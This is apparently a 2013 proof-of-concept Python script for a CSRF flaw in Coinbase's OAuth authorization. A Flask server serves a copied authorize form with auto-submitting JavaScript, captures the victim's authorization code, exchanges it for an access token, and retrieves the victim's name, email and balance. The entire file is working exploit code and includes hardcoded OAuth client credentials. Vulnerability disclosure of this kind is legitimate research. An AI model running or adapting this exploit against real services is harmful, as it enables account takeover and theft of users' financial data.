#!/usr/bin/python
# -*- coding: utf-8 -*-

# Coinbase.com OAuth Authorization PoC
# Donncha O'Cearbhaill - 4/05/13
# donncha@donncha.is - PGP: 0xAEC10762

import requests
import json
from BeautifulSoup import BeautifulSoup
from flask import Flask, request, render_template

#from flask.ext.basicauth import BasicAuth

# This is a very rough PoC script but it should be enough to demonstate the vulnerability. When one user loads the OAuth authorize page
# for an attacker's OAuth2 app, they can get correct values for authenticity token, which can then be used to submit a "confirm
# authorization request" in the context of the victim. The form is submitted by the victim viewing any page or link with
# the copied auth form, and an attacker can then obtains victims access_token and result in a complete compromise of the victim's account.

# Credentials for malicious OAuth2 application
CLIENT_ID = '8599dc2e5a8c779789b6f2f6bb594fa7a18286755801a165eee2be4a4fd846c9'
CLIENT_SECRET = '978c0846cd6a52c87ac17debe57112fcc99ade59032dd9c92390f90456e7716a'
CALLBACK_URL = 'http://localhost:8443/callback'
OAUTH_URL = 'https://coinbase.com/oauth/authorize?response_type=code&client_id=' + CLIENT_ID + '&redirect_uri=' + CALLBACK_URL

# These are session cookies for an attacker account used to retrieve the OAuth2 form and tokens.
cookie = {
    '_coinbase_session': 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',
    'df': 'XXXXXXXXXXXXXXXXXXXXX',
    '__ssid': 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',
    'return_to': '',
    }


def retrieveOAuthForm(oauth_url, cookie):
    '''Make an request to the OAuth authorize page and get a copy
       of the form and CSRF values to send to the victim'''
    r = requests.get(oauth_url, cookies=cookie)
    if r.status_code == 200:
        oauth_confirmation = BeautifulSoup(r.text)
        oauth_form = oauth_confirmation.find('form')

	# Change the relative form action to an absolute URL
        oauth_form['action'] = 'https://coinbase.com' + oauth_form['action']
        oauth_form = str(oauth_form) + '<script type="text/javascript">document.forms[0].submit();</script>'
        return oauth_form
    else:
        return 'The OAuth form could not be retrieved, maybe the current requesting user has already authorised this form. Error: ' + str(r.status_code)


def getAccessToken(code_token):
    '''Use the returned callback code to obtain a full access_token'''

    access_token_data = {
        'grant_type': 'authorization_code',
        'code': code_token,
        'redirect_uri': CALLBACK_URL,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        }
    r = requests.post('https://coinbase.com/oauth/token', data=access_token_data)
    if r.status_code == 200:  # Request was successful, output access token and return it.
        #token_data = json.loads(r.text)
        return str(json.loads(r.text)['access_token'])
    else:
        print 'There was an error retrieving the access_token'
        print r.text


# Setup Flask Webserver
app = Flask(__name__, template_folder="templates-oauth")

@app.route('/')
def index():
    # Retrieve authorization form and return it to the user
    return render_template('index.html', oauthform=retrieveOAuthForm(OAUTH_URL, cookie).decode('utf-8'))


# Retrieve the code token from the callback, get the access token and make some tests.
@app.route('/callback')
def callbackPage():
    code_token = str(request.args.get('code', ''))
    print 'Callback Code: ' + code_token  # Log code to stdout
    access_token = str(getAccessToken(code_token))
    if len(access_token) == 64:  # Check we got an access token in the expected format
        print 'Access Token: ' + access_token  # Log access_token to stdout

        # Retrieve some victim information to confirm the compromise.
        user_json = requests.get('https://coinbase.com/api/v1/users?access_token=' + access_token)

        # Create output data
        user = json.loads(user_json.content)['users'][0]['user']
        results = [
        		('ID', user['id']),
        		('Name', user['name']),
        		('Email',	user['email']),
        		('Currency', user['native_currency']),
        		('Balance', user['balance']['amount']+' '+user['balance']['currency']),
        ]

        print results
        return render_template('result.html', code_token=code_token, access_token=access_token, results=results)
    else:
        return 'Error: Could not retrieve access token'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8443, debug=True)
